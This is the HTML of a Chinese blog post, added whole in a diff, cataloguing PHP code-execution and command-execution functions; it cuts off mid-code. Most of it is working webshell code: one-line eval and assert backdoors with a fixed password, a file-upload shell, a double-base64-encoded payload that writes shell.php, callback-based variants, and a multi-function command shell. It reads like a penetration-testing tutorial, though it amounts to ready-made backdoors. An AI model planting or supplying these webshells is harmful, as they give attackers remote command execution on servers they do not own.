@@ -1,0 +1,806 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '7.2.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="1、eval()函数1234#传入的参数必须为PHP代码，既需要以分号结尾。#命令執行：cmd=system(whoami);#菜刀连接密码：cmd&amp;lt;?php @eval($_POST[&amp;apos;cmd&amp;apos;]);?&amp;gt;   那么当我们上传了eval函数的菜刀马之后，在连接不上菜刀的情况下怎么上传大马呢？继续往下看这里我是先写一个上传马，再用上传马去上传大马，有点多次一举，但是考">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php中代码执行">
+<meta property="og:url" content="http://yoursite.com/2019/10/24/php中代码执行&&命令执行函数/index.html">
+<meta property="og:site_name" content="菜鸟博客">
+<meta property="og:description" content="1、eval()函数1234#传入的参数必须为PHP代码，既需要以分号结尾。#命令執行：cmd=system(whoami);#菜刀连接密码：cmd&amp;lt;?php @eval($_POST[&amp;apos;cmd&amp;apos;]);?&amp;gt;   那么当我们上传了eval函数的菜刀马之后，在连接不上菜刀的情况下怎么上传大马呢？继续往下看这里我是先写一个上传马，再用上传马去上传大马，有点多次一举，但是考">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190506131338640-1269225603.png">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190506131549162-1232641888.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190506131626039-808732056.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190506131853747-1525048065.png">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190506132111271-849125843.png">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190506132934297-1853048567.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190506132944801-681034947.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190506132954499-1249643553.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190506133052527-299482910.png">
+<meta property="og:updated_time" content="2019-10-24T08:54:08.217Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="php中代码执行">
+<meta name="twitter:description" content="1、eval()函数1234#传入的参数必须为PHP代码，既需要以分号结尾。#命令執行：cmd=system(whoami);#菜刀连接密码：cmd&amp;lt;?php @eval($_POST[&amp;apos;cmd&amp;apos;]);?&amp;gt;   那么当我们上传了eval函数的菜刀马之后，在连接不上菜刀的情况下怎么上传大马呢？继续往下看这里我是先写一个上传马，再用上传马去上传大马，有点多次一举，但是考">
+<meta name="twitter:image" content="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190506131338640-1269225603.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2019/10/24/php中代码执行&&命令执行函数/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>php中代码执行 | 菜鸟博客</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">菜鸟博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/24/php中代码执行&&命令执行函数/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="VegyChick">
+      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="菜鸟博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">php中代码执行
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-10-24 16:53:20 / 修改时间：16:54:08" itemprop="dateCreated datePublished" datetime="2019-10-24T16:53:20+08:00">2019-10-24</time>
+            </span>
+          
+
+          
+            
+
+            
+          
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          <br>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="1、eval-函数"><a href="#1、eval-函数" class="headerlink" title="1、eval()函数"></a>1、eval()函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#传入的参数必须为PHP代码，既需要以分号结尾。</span><br><span class="line">#命令執行：cmd=system(whoami);</span><br><span class="line">#菜刀连接密码：cmd</span><br><span class="line">&lt;?php @eval($_POST[&apos;cmd&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190506131338640-1269225603.png" alt="img"></p>
+<p>那么当我们上传了eval函数的菜刀马之后，在连接不上菜刀的情况下怎么上传大马呢？继续往下看<br>这里我是先写一个上传马，再用上传马去上传大马，有点多次一举，但是考虑到大马代码量太多，还是建议先写个上传马，以下代码只有1kb。</p>
+<p><a href="javascript:void(0);" target="_blank" rel="noopener"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@$temp = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">@$file = basename($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">if (empty ($file))&#123;</span><br><span class="line">echo &quot;&lt;form action = &apos;&apos; method = &apos;POST&apos; ENCTYPE=&apos;multipart/form-data&apos;&gt;\n&quot;;echo &quot;Local file: &lt;input type = &apos;file&apos; name = &apos;upload_file&apos;&gt;\n&quot;;echo &quot;&lt;input type = &apos;submit&apos; value = &apos;Upload&apos;&gt;\n&quot;;echo &quot;&lt;/form&gt;\n&lt;pre&gt;\n\n&lt;/pre&gt;&quot;;&#125;else &#123;if(move_uploaded_file($temp,$file))&#123;echo &quot;File uploaded successfully.&lt;p&gt;\n&quot;;&#125;else &#123;echo &quot;Unable to upload &quot; . $file . &quot;.&lt;p&gt;\n&quot;;&#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a href="javascript:void(0);" target="_blank" rel="noopener"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p>
+<p>原理是利用文件操作函数如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fputs(fopen(shell.php,w),xxxx);</span><br></pre></td></tr></table></figure>
+
+<p>写入xxxx到脚本执行文件当前目录下的shell.php文件。<br>由于是利用post传参，不能出现【&lt;】【&gt;】【+】【=】【/】等符号，所以这里我们需要把代码编码一下，将上面的上传代码进行两次base64编码（为了去除=号）。</p>
+<p>☆☆☆在编码的时候空格和回车都会影响编码后的结果，因此建议大家直接复制我上面的上传马或者用下面我编码好的，或者自己去慢慢尝试直到base64编码后为一串自由数字和字母的字符串即可。<br>接下来利用文件操作函数写入上传马，注意不要忘了最后的分号。</p>
+<p><a href="javascript:void(0);" target="_blank" rel="noopener"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(base64_decode(UEQ5d2FIQWdEUXBBSkhSbGJYQWdQU0FrWDBaSlRFVlRXeWQxY0d4dllXUmZabWxzWlNkZFd5ZDBiWEJmYm1GdFpTZGRPdzBLUUNSbWFXeGxJRDBnWW1GelpXNWhiV1VvSkY5R1NVeEZVMXNuZFhCc2IyRmtYMlpwYkdVblhWc25ibUZ0WlNkZEtUc05DbWxtSUNobGJYQjBlU0FvSkdacGJHVXBLWHNOQ21WamFHOGdJanhtYjNKdElHRmpkR2x2YmlBOUlDY25JRzFsZEdodlpDQTlJQ2RRVDFOVUp5QkZUa05VV1ZCRlBTZHRkV3gwYVhCaGNuUXZabTl5YlMxa1lYUmhKejVjYmlJN1pXTm9ieUFpVEc5allXd2dabWxzWlRvZ1BHbHVjSFYwSUhSNWNHVWdQU0FuWm1sc1pTY2dibUZ0WlNBOUlDZDFjR3h2WVdSZlptbHNaU2MrWEc0aU8yVmphRzhnSWp4cGJuQjFkQ0IwZVhCbElEMGdKM04xWW0xcGRDY2dkbUZzZFdVZ1BTQW5WWEJzYjJGa0p6NWNiaUk3WldOb2J5QWlQQzltYjNKdFBseHVQSEJ5WlQ1Y2JseHVQQzl3Y21VK0lqdDlaV3h6WlNCN2FXWW9iVzkyWlY5MWNHeHZZV1JsWkY5bWFXeGxLQ1IwWlcxd0xDUm1hV3hsS1NsN1pXTm9ieUFpUm1sc1pTQjFjR3h2WVdSbFpDQnpkV05qWlhOelpuVnNiSGt1UEhBK1hHNGlPMzFsYkhObElIdGxZMmh2SUNKVmJtRmliR1VnZEc4Z2RYQnNiMkZrSUNJZ0xpQWtabWxzWlNBdUlDSXVQSEErWEc0aU8zMTlQejQ9)));</span><br></pre></td></tr></table></figure>
+
+<p><a href="javascript:void(0);" target="_blank" rel="noopener"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p>
+<p>成功得到上传马，之后就是上传我们的大马了。</p>
+<p><img src="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190506131549162-1232641888.png" alt="img"></p>
+<h3 id="2、assert-函数"><a href="#2、assert-函数" class="headerlink" title="2、assert()函数"></a>2、assert()函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#assert函数是直接将传入的参数当成PHP代码直接，不需要以分号结尾，当然你加上也可以。</span><br><span class="line">#命令執行：cmd=system(whoami)</span><br><span class="line">#菜刀连接密码：cmd</span><br><span class="line">&lt;?php @assert($_POST[&apos;cmd&apos;])?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190506131626039-808732056.png" alt="img"></p>
+<p>上传大马,这一步参考eval函数。</p>
+<p> 其他的代码执行函数还有以下几个，均给出了菜刀马和连接方式：</p>
+<h3 id="3、preg-replace"><a href="#3、preg-replace" class="headerlink" title="3、preg_replace()"></a>3、preg_replace()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#preg_replace(&apos;正则规则&apos;,&apos;替换字符&apos;，&apos;目标字符&apos;)</span><br><span class="line">#执行命令和上传文件参考assert函数(不需要加分号)。</span><br><span class="line">#将目标字符中符合正则规则的字符替换为替换字符，此时如果正则规则中使用/e修饰符，则存在代码执行漏洞。</span><br><span class="line">preg_replace(&quot;/test/e&quot;,$_POST[&quot;cmd&quot;],&quot;jutst test&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>这里可以使用chr()函数转换ASCII编码来执行代码。</p>
+<blockquote>
+<p>#phpinfo();<br>eval(chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111).chr(40).chr(41).chr(59))</p>
+</blockquote>
+<p> <img src="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190506131853747-1525048065.png" alt="img"></p>
+<h3 id="4、create-function-函数"><a href="#4、create-function-函数" class="headerlink" title="4、create_function()函数"></a>4、create_function()函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#创建匿名函数执行代码</span><br><span class="line">#执行命令和上传文件参考eval函数(必须加分号)。</span><br><span class="line">#菜刀连接密码：cmd</span><br><span class="line">$func =create_function(&apos;&apos;,$_POST[&apos;cmd&apos;]);$func();</span><br></pre></td></tr></table></figure>
+
+<h3 id="5、array-map-函数"><a href="#5、array-map-函数" class="headerlink" title="5、array_map()函数"></a>5、array_map()函数</h3><p><a href="javascript:void(0);" target="_blank" rel="noopener"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。</span><br><span class="line">#命令执行http://localhost/123.php?func=system   cmd=whoami</span><br><span class="line">#菜刀连接http://localhost/123.php?func=assert   密码：cmd</span><br><span class="line">$func=$_GET[&apos;func&apos;];</span><br><span class="line">$cmd=$_POST[&apos;cmd&apos;];</span><br><span class="line">$array[0]=$cmd;</span><br><span class="line">$new_array=array_map($func,$array);</span><br><span class="line">echo $new_array;</span><br></pre></td></tr></table></figure>
+
+<p><a href="javascript:void(0);" target="_blank" rel="noopener"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p>
+<p><img src="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190506132111271-849125843.png" alt="img"></p>
+<h3 id="6、call-user-func-函数"><a href="#6、call-user-func-函数" class="headerlink" title="6、call_user_func()函数"></a>6、call_user_func()函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#传入的参数作为assert函数的参数</span><br><span class="line">#cmd=system(whoami)</span><br><span class="line">#菜刀连接密码：cmd</span><br><span class="line">call_user_func(&quot;assert&quot;,$_POST[&apos;cmd&apos;]);</span><br></pre></td></tr></table></figure>
+
+<h3 id="7、call-user-func-array-函数"><a href="#7、call-user-func-array-函数" class="headerlink" title="7、call_user_func_array()函数"></a>7、call_user_func_array()函数</h3><p><a href="javascript:void(0);" target="_blank" rel="noopener"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#将传入的参数作为数组的第一个值传递给assert函数</span><br><span class="line">#cmd=system(whoami)</span><br><span class="line">#菜刀连接密码：cmd</span><br><span class="line">$cmd=$_POST[&apos;cmd&apos;];</span><br><span class="line">$array[0]=$cmd;</span><br><span class="line">call_user_func_array(&quot;assert&quot;,$array);</span><br></pre></td></tr></table></figure>
+
+<p><a href="javascript:void(0);" target="_blank" rel="noopener"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p>
+<h3 id="8、array-filter-函数"><a href="#8、array-filter-函数" class="headerlink" title="8、array_filter()函数"></a>8、array_filter()函数</h3><p><a href="javascript:void(0);" target="_blank" rel="noopener"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#用回调函数过滤数组中的元素：array_filter(数组,函数)</span><br><span class="line">#命令执行func=system&amp;cmd=whoami</span><br><span class="line">#菜刀连接http://localhost/123.php?func=assert  密码cmd</span><br><span class="line">$cmd=$_POST[&apos;cmd&apos;];</span><br><span class="line">$array1=array($cmd);</span><br><span class="line">$func =$_GET[&apos;func&apos;];</span><br><span class="line">array_filter($array1,$func);</span><br></pre></td></tr></table></figure>
+
+<p><a href="javascript:void(0);" target="_blank" rel="noopener"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p>
+<h3 id="9、uasort-函数"><a href="#9、uasort-函数" class="headerlink" title="9、uasort()函数"></a>9、uasort()函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#php环境&gt;=&lt;5.6才能用</span><br><span class="line">#uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。</span><br><span class="line">#命令执行：http://localhost/123.php?1=1+1&amp;2=eval($_GET[cmd])&amp;cmd=system(whoami);</span><br><span class="line">#菜刀连接：http://localhost/123.php?1=1+1&amp;2=eval($_POST[cmd])   密码：cmd</span><br><span class="line">usort($_GET,&apos;asse&apos;.&apos;rt&apos;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="二、命令执行函数"><a href="#二、命令执行函数" class="headerlink" title="二、命令执行函数"></a>二、命令执行函数</h2><p>PHP执行系统命令的有几个常用的函数,如有:system函数、exec函数、popen函数,passthru,shell_exec函数他们都可以执行系统命令，下面是我整理的一个命令马，把常见的命令执行函数都做了一个梳理，如果大家还有什么新的思路或见解，可以一起交流交流。</p>
+<p><a href="javascript:void(0);" target="_blank" rel="noopener"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$command=$_POST[&apos;cmd&apos;];</span><br><span class="line">#function exec_all($command)</span><br><span class="line">#&#123;</span><br><span class="line">    </span><br><span class="line">//system函数可执行并直接显示结果</span><br><span class="line">if(function_exists(&apos;system&apos;))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">    system($command);</span><br><span class="line">    echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">//passthru函数可执行并直接显示结果</span><br><span class="line">else if(function_exists(&apos;passthru&apos;))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">    passthru($command);</span><br><span class="line">    echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">//shell_exec函数可执行但需要加echo才能显示结果</span><br><span class="line">else if(function_exists(&apos;shell_exec&apos;))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">    echo shell_exec($command);</span><br><span class="line">    echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">//function exec(命令，以数组形式的保存结果，命令执行的状态码)</span><br><span class="line">//可执行，但需要加echo才能显示结果</span><br><span class="line">else if(function_exists(&apos;exec&apos;))</span><br><span class="line">&#123;  </span><br><span class="line">    echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">    exec($command,$output);</span><br><span class="line">    echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">    print_r($output);</span><br><span class="line">    echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">//popen函数：打开一个指向进程的管道，该进程由派生指定的 command 命令执行而产生。</span><br><span class="line">//返回一个和 fopen() 所返回的相同的文件指针，只不过它是单向的（只能用于读或写）</span><br><span class="line">//此指针可以用于 fgets()，fgetss() 和 fwrite()。并且必须用 pclose() 来关闭。</span><br><span class="line">//若出错，则返回 false。</span><br><span class="line">else if(function_exists(&apos;popen&apos;))</span><br><span class="line">&#123;</span><br><span class="line">    $handle = popen($command , &quot;r&quot;); // Open the command pipe for reading</span><br><span class="line">    if(is_resource($handle))</span><br><span class="line">    &#123;</span><br><span class="line">        if(function_exists(&apos;fread&apos;) &amp;&amp; function_exists(&apos;feof&apos;))</span><br><span class="line">        &#123;</span><br><span class="line">            echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">            while(!feof($handle))</span><br><span class="line">            &#123;</span><br><span class="line">                echo fread($handle, 1024);        </span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else if(function_exists(&apos;fgets&apos;) &amp;&amp; function_exists(&apos;feof&apos;))</span><br><span class="line">        &#123;</span><br><span class="line">            echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">            while(!feof($handle))</span><br><span class="line">            &#123;       </span><br><span class="line">                echo fgets($handle,1024);</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pclose($handle);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">//proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。</span><br><span class="line">else if(function_exists(&apos;proc_open&apos;))</span><br><span class="line">&#123;</span><br><span class="line">    $descriptorspec = array(</span><br><span class="line">            1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  // stdout is a pipe that the child will write to</span><br><span class="line">            );</span><br><span class="line">    $handle = proc_open($command ,$descriptorspec , $pipes); // This will return the output to an array &apos;pipes&apos;</span><br><span class="line">    if(is_resource($handle))</span><br><span class="line">    &#123;</span><br><span class="line">        if(function_exists(&apos;fread&apos;) &amp;&amp; function_exists(&apos;feof&apos;))</span><br><span class="line">        &#123;</span><br><span class="line">            echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">            while(!feof($pipes[1]))</span><br><span class="line">            &#123;</span><br><span class="line">                echo fread($pipes[1], 1024);        </span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else if(function_exists(&apos;fgets&apos;) &amp;&amp; function_exists(&apos;feof&apos;))</span><br><span class="line">        &#123;</span><br><span class="line">            echo 